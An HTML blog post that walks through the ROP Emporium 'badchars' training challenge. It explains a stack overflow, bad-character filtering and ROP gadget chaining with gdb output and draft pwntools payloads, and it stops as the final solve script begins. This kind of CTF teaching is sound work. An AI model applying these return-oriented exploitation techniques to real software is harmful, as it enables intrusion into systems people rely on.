<!doctype html><html lang=en-us><head><title>Upsolving Suite: Pwn Progress | flocto</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=generator content="Hugo 0.117.0"><link rel=canonical href=/writeups/2023/upsolving/upsolving-suite-2-pwn-progress/><link href=/sass/main.min.678841d891b0415c3b0c556212e6e4c3789547455c5d005f7325a28f8e54740a.css rel=stylesheet></head><body><div class=flexWrapper><header class=headerWrapper><div class=header><div><a href=/><span class=terminal>fl@cto ~ $</span></a></div><nav class=headerLinks><ul><li><a href=/about title>~/about</a></li><li><a href=/projects title>~/projects</a></li><li><a href=/writeups title>~/writeups</a></li><li><a href=/blog title>~/blog</a></li><li><a href=/ style=align-items:center;justify-content:center><img style=width:30px;height:30px;border-radius:15px;vertical-align:text-bottom src=/profile.png alt=Home></a></li></ul></nav></div></header><div class=content><main class=main><div class=postWrapper><h1>Upsolving Suite: Pwn Progress</h1><ul class=tagList><li class=tagItem><a class=tagLink href=/tags/2023/>2023</a></li><li class=tagItem><a class=tagLink href=/tags/upsolve/>upsolve</a></li><li class=tagItem><a class=tagLink href=/tags/pwn/>pwn</a></li></ul><div><p>So I&rsquo;ll just preface this post with a bit of a disclaimer, this isn&rsquo;t actually upsolving. I&rsquo;ll just be doing a writeup over <code>badchars</code> from the great site <a href=https://ropemporium.com/>ROP Emporium</a>. But, this is still my first time actually doing binary exploitation, so I&rsquo;ll try to be as thorough as possible for people in the same position. Do note this writeup assumes basic knowledge of assembly and the stack.</p><h2 id=preface>Preface</h2><blockquote><p>An arbitrary write challenge with a twist; certain input characters get mangled as they make their way onto the stack.
Find a way to deal with this and craft your exploit.</p></blockquote><p>I&rsquo;ll be doing the <a href=https://ropemporium.com/binary/badchars.zip><code>x86_64</code> challenge</a> for today.</p><p>So here&rsquo;s a basic rundown of the challenge:</p><p>We have a binary that takes input from the user. There&rsquo;s a simple basic overflow, where <code>0x200</code> bytes of input are read but only <code>0x20</code> are allocated for the buffer.</p><p>Our goal is to call a function <code>print_file</code>, with our own argument (in this case <code>'flag.txt'</code>). However, there are two catches:</p><ol><li>The string <code>flag.txt</code> doesn&rsquo;t exist in the binary by default, so we somehow need to write it into memory.</li><li>The crux of the challenge, there are a few banned characters that get replaced when we try to pass them in as input.</li></ol><p>Alright, so let&rsquo;s get started. Though this challenge is meant to build on the last challenge, <code>write4</code>, where you just have to write <code>flag.txt</code> to memory, I&rsquo;ll go over this challenge from the very beginning.</p><h2 id=binary-analysis>Binary Analysis</h2><p>First let&rsquo;s take a look at the binary itself. There&rsquo;s two parts here, the actual executable that we run and the <code>.so</code> library that gets loaded by the executable.</p><p>In the actual executable, we have a pretty simple <code>main</code> function:
<img src=/img/writeups/2023/upsolving/pwn-progress-2/main.png alt="main() function that calls pwnme()"></p><p>Now this <code>pwnme</code> function is inside the <code>libbadchars.so</code> library, so we need to look in there to see:
<img src=/img/writeups/2023/upsolving/pwn-progress-2/pwnme.png alt="pwnme() decompilation"></p><p>We see that it reads in <code>0x200</code> bytes into a <code>var_28</code>, a buffer that only allocates <code>0x20</code> bytes. This is the simple overflow that I described earlier.</p><p>After reading in those bytes, it loops through every byte we input, checks if any of them are <code>'x', 'g', 'a', or '.'</code>, and replaces them with the byte <code>0xeb</code> if they are.</p><p>So how do we go about exploiting this binary?</p><h2 id=rop-rop-rop-your-boat>Rop rop rop your boat</h2><p>Well, first thing&rsquo;s first, let&rsquo;s see what we can do with the buffer overflow.</p><p>I&rsquo;ll run through this section in <code>gdb</code> (with <code>gef</code>). Thankfully PIE is disabled so the addresses should be the same for everyone.</p><p>Anyway, here&rsquo;s what the stack looks like right before the <code>read</code> call:</p><div class=highlight><div style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">10
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>0x007fffffffda50│+0x0000: 0x00000000000006f0     ← $rsp
</span></span><span style=display:flex><span>0x007fffffffda58│+0x0008: 0x007fffffffde39  →  0x537717b1438594eb
</span></span><span style=display:flex><span>0x007fffffffda60│+0x0010: 0x007ffff7fc1000  →  0x00010102464c457f
</span></span><span style=display:flex><span>0x007fffffffda68│+0x0018: 0x0000010101000000
</span></span><span style=display:flex><span>0x007fffffffda70│+0x0020: 0x0000000000000000     ← $rax, $rsi
</span></span><span style=display:flex><span>0x007fffffffda78│+0x0028: 0x0000000000000000
</span></span><span style=display:flex><span>0x007fffffffda80│+0x0030: 0x0000000000000000
</span></span><span style=display:flex><span>0x007fffffffda88│+0x0038: 0x0000000000000000
</span></span><span style=display:flex><span>0x007fffffffda90│+0x0040: 0x00007fffffffdaa0
</span></span><span style=display:flex><span>0x007fffffffda98│+0x0048: 0x0000000000400610
</span></span></code></pre></td></tr></table></div></div><p>And here&rsquo;s what it looks like right before the <code>ret</code> of the <code>pwnme</code> function (assuming we don&rsquo;t overwrite anything):</p><div class=highlight><div style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">8
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>0x007fffffffda98│+0x0000: 0x00000000400610  →  &lt;main+9&gt; mov eax, 0x0     ← $rsp
</span></span><span style=display:flex><span>0x007fffffffdaa0│+0x0008: 0x0000000000000001
</span></span><span style=display:flex><span>0x007fffffffdaa8│+0x0010: 0x007ffff7a01d90  →  &lt;__libc_start_call_main+128&gt; mov edi, eax
</span></span><span style=display:flex><span>0x007fffffffdab0│+0x0018: 0x0000000000000000
</span></span><span style=display:flex><span>0x007fffffffdab8│+0x0020: 0x00000000400607  →  &lt;main+0&gt; push rbp
</span></span><span style=display:flex><span>0x007fffffffdac0│+0x0028: 0x00000001ffffdba0
</span></span><span style=display:flex><span>0x007fffffffdac8│+0x0030: 0x007fffffffdbb8  →  0x007fffffffde5b 
</span></span><span style=display:flex><span>0x007fffffffdad0│+0x0038: 0x0000000000000000
</span></span></code></pre></td></tr></table></div></div><p>When the <code>ret</code> instruction is run, the most important thing it&rsquo;s doing is <code>pop $rip</code>. The value at the top of the stack is popped into the instruction pointer, jumping to that address. There&rsquo;s some more that occurs but only this jump is important.</p><p>Normally, this pointer would just resume whatever function call was occurring before. But we can change that. The way <a href=https://en.wikipedia.org/wiki/Return-oriented_programming>ROP (Return-oriented-programming)</a> works is by making the <code>ret</code> instruction jump to a different function than expected.</p><p>If we can overwrite the bytes <code>0x28</code> above where our input is read, at <code>0x007fffffffda98</code>, we can overwrite the address that <code>ret</code> will return to.</p><p>For example, here&rsquo;s how we could jump back to <code>pwnme</code> after the <code>ret</code>:</p><div class=highlight><div style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">10
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span><span style=color:#c678dd>from</span> <span style=color:#76a9f9>pwn</span> <span style=color:#c678dd>import</span> <span style=color:#c7bf54>*</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c1abea>elf</span> <span style=color:#c7bf54>=</span> <span style=color:#c1abea>ELF</span>(<span style=color:#98c379>&#39;./badchars&#39;</span>)
</span></span><span style=display:flex><span><span style=color:#c1abea>p</span> <span style=color:#c7bf54>=</span> <span style=color:#c1abea>process</span>(<span style=color:#98c379>&#39;./badchars&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c1abea>payload</span> <span style=color:#c7bf54>=</span> <span style=color:#98c379>b</span><span style=color:#98c379>&#39;A&#39;</span> <span style=color:#c7bf54>*</span> <span style=color:#d19a66>0x28</span> <span style=color:#8a93a5;font-style:italic># 0x28 bytes of padding</span>
</span></span><span style=display:flex><span><span style=color:#c1abea>payload</span> <span style=color:#c7bf54>+=</span> <span style=color:#c1abea>p64</span>(<span style=color:#c1abea>elf</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>symbols</span>[<span style=color:#98c379>&#39;pwnme&#39;</span>]) <span style=color:#8a93a5;font-style:italic># overwrite the return address</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c1abea>p</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>sendline</span>(<span style=color:#c1abea>payload</span>)
</span></span><span style=display:flex><span><span style=color:#c1abea>p</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>interactive</span>()
</span></span></code></pre></td></tr></table></div></div><p>This will overwrite the return address with the beginning of the <code>pwnme</code> function, so it will just run the function again.</p><p>But we need to actually do something useful, including writing to memory&mldr;</p><h2 id=gah-dgets>Gah-dgets</h2><p>First of all, let&rsquo;s figure out what we can do with an arbitrary jump.</p><p>In ROP, most of the time you&rsquo;ll be using gadgets. These are small pieces of code that come from pre-existing functions in the binary. They&rsquo;re usually just a few instructions long, and they&rsquo;re useful for doing things like writing or reading memory.</p><p>Additionally, these gadgets usually end with another <code>ret</code> or <code>jmp</code> instruction, so that they can be chained together.</p><p>We can use the tool <a href=https://github.com/JonathanSalwan/ROPgadget><code>ROPgadget</code></a> to find useful gadgets in the binary:</p><div class=highlight><div style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">1
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>ROPgadget --binary badchars --ropchain
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">17
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>Gadgets information
</span></span><span style=display:flex><span>============================================================
</span></span><span style=display:flex><span>[lots of gadgets here]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Unique gadgets found: 83
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>ROP chain generation
</span></span><span style=display:flex><span>===========================================================
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>- Step 1 -- Write-what-where gadgets
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        [+] Gadget found: 0x400634 mov qword ptr [r13], r12 ; ret
</span></span><span style=display:flex><span>        [+] Gadget found: 0x40069e pop r13 ; pop r14 ; pop r15 ; ret
</span></span><span style=display:flex><span>        [+] Gadget found: 0x40069c pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
</span></span><span style=display:flex><span>        [-] Can&#39;t find the &#39;xor r12, r12&#39; gadget. Try with another &#39;mov [reg], reg&#39;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        [-] Can&#39;t find the &#39;mov qword ptr [r64], r64&#39; gadget
</span></span></code></pre></td></tr></table></div></div><p>There&rsquo;s a lot of gadgets present, but we only need a few to do what we want. First of all, we need to write to memory. We can use the <code>mov qword ptr [r13], r12 ; ret</code> gadget to do this. This gadget will write the qword value (8 bytes) in <code>r12</code> to the address in <code>r13</code>.</p><p>Additionally, to load values into <code>r12</code> and <code>r13</code>, we have the gadget at <code>0x40069c</code>, that pops values into <code>r12</code>, <code>r13</code>, <code>r14</code>, and <code>r15</code>. We just need to fill <code>r14</code> and <code>r15</code> with garbage values, since we don&rsquo;t need them.</p><h3 id=read-only-not-write-only>Read-only, not write-only</h3><p>But where do we write this data anyway? We know that we need to write <code>flag.txt</code> somewhere so that it can be called by <code>print_file</code>, but where exactly?</p><p>If we try to write over the existing <code>"nonexistent"</code> string inside the binary, we&rsquo;ll run into a problem:
<img src=/img/writeups/2023/upsolving/pwn-progress-2/rodata.png alt="the string is inside .rodata"></p><p>The string is inside the <code>.rodata</code> section, which is read-only, so we can&rsquo;t write to it. But thankfully, the actual <code>.data</code> section is empty, and we can actually write to it.
<img src=/img/writeups/2023/upsolving/pwn-progress-2/data.png alt="We can overwrite .data"></p><p>So we&rsquo;ll just put our string there.</p><p>Alright, so here&rsquo;s what our exploit is looking like currently:</p><div class=highlight><div style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">14
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span><span style=color:#c678dd>from</span> <span style=color:#76a9f9>pwn</span> <span style=color:#c678dd>import</span> <span style=color:#c7bf54>*</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c1abea>elf</span> <span style=color:#c7bf54>=</span> <span style=color:#c1abea>ELF</span>(<span style=color:#98c379>&#39;./badchars&#39;</span>)
</span></span><span style=display:flex><span><span style=color:#c1abea>p</span> <span style=color:#c7bf54>=</span> <span style=color:#c1abea>process</span>(<span style=color:#98c379>&#39;./badchars&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c1abea>payload</span> <span style=color:#c7bf54>=</span> <span style=color:#98c379>b</span><span style=color:#98c379>&#39;A&#39;</span> <span style=color:#c7bf54>*</span> <span style=color:#d19a66>0x28</span> <span style=color:#8a93a5;font-style:italic># 0x28 bytes of padding</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c1abea>payload</span> <span style=color:#c7bf54>+=</span> <span style=color:#c1abea>p64</span>(<span style=color:#d19a66>0x40069c</span>) <span style=color:#8a93a5;font-style:italic># pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span>
</span></span><span style=display:flex><span><span style=color:#c1abea>payload</span> <span style=color:#c7bf54>+=</span> <span style=color:#98c379>b</span><span style=color:#98c379>&#39;flag.txt&#39;</span> <span style=color:#8a93a5;font-style:italic># r12</span>
</span></span><span style=display:flex><span><span style=color:#c1abea>payload</span> <span style=color:#c7bf54>+=</span> <span style=color:#c1abea>p64</span>(<span style=color:#d19a66>0x0601028</span>) <span style=color:#8a93a5;font-style:italic># r13</span>
</span></span><span style=display:flex><span><span style=color:#c1abea>payload</span> <span style=color:#c7bf54>+=</span> <span style=color:#98c379>b</span><span style=color:#98c379>&#39;AAAAAAAA&#39;</span> <span style=color:#8a93a5;font-style:italic># r14</span>
</span></span><span style=display:flex><span><span style=color:#c1abea>payload</span> <span style=color:#c7bf54>+=</span> <span style=color:#98c379>b</span><span style=color:#98c379>&#39;AAAAAAAA&#39;</span> <span style=color:#8a93a5;font-style:italic># r15</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c1abea>payload</span> <span style=color:#c7bf54>+=</span> <span style=color:#c1abea>p64</span>(<span style=color:#d19a66>0x400634</span>) <span style=color:#8a93a5;font-style:italic># mov qword ptr [r13], r12 ; ret</span>
</span></span></code></pre></td></tr></table></div></div><p>But of course, this won&rsquo;t work. We still have banned characters inside the <code>flag.txt</code> string, so we need to change those somehow.</p><h2 id=i-wonder-who-left-these-here>I wonder who left these here&mldr;</h2><p>Looking at the other gadgets, we need something that is also able to modify memory. Well, thankfully, the author of the challenge left use some very useful gadgets in the binary - including the <code>mov</code> gadget we used earlier!
<img src=/img/writeups/2023/upsolving/pwn-progress-2/usefulgadgets.png alt="list of useful gadgets"></p><p>Well, there&rsquo;s a lot to choose from here, but let&rsquo;s just use the <code>xor byte ptr [r15], r14b ; ret</code> gadget for simplicity.</p><p>Now, we can change our exploit to use this gadget to modify the banned characters:</p><ul><li>First, we choose a fixed value to <code>xor</code> the banned characters by (say 100)</li><li>Then, we load in the <code>flag.txt</code> string with the banned characters already <code>xor</code>ed</li><li>Next, we <code>xor</code> each banned character with the fixed value again, to get the original banned character back</li><li>Finally, we can call <code>print_file</code> with the <code>flag.txt</code> string</li></ul><h3 id=wait-calling>Wait, calling?</h3><p>Actually, we also never covered how to call the final function with our string anyway.</p><p>Well, let&rsquo;s take a look inside <code>gdb</code> and see how arguments are passed to functions. Here&rsquo;s an example of a <code>puts</code> inside the <code>pwnme</code> function:
<img src=/img/writeups/2023/upsolving/pwn-progress-2/putscall.png alt="puts@plt ($rdi, $rsi, $rdx)"></p><p>As you can see, the first argument to the function is passed in <code>rdi</code>, the second in <code>rsi</code>, and the third in <code>rdx</code>.</p><p>That means to call <code>print_file</code> with our <code>flag.txt</code> string, we need to load the address of the string into <code>rdi</code> and then call <code>print_file</code>.</p><p>Using ROPgadget again, we can see that thankfully there&rsquo;s a simple <code>pop rdi</code> gadget:</p><pre tabindex=0><code>0x00000000004006a3 : pop rdi ; ret
</code></pre><p>So all we need to do is load the address of the string onto the stack, use the <code>pop rdi</code> gadget, then <code>ret</code> to the start of <code>print_file</code>.</p><p>That&rsquo;s all the parts we need. But before we write the exploit we need to keep in mind two things:</p><ol><li>The gadget for writing to memory is a <code>qword ptr</code>, but the <code>xor</code> gadget only uses a <code>byte ptr</code>. This means we need to <code>xor</code> each banned character individually.</li><li>Additionally, the bad chars can&rsquo;t be present at any part of the payload, <em>including</em> the addresses we use.</li></ol><p>Here&rsquo;s a quick draft of the exploit, I&rsquo;ve created a helper function to make things easier:</p><p>filename=solve.py</p><div class=highlight><div style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">30
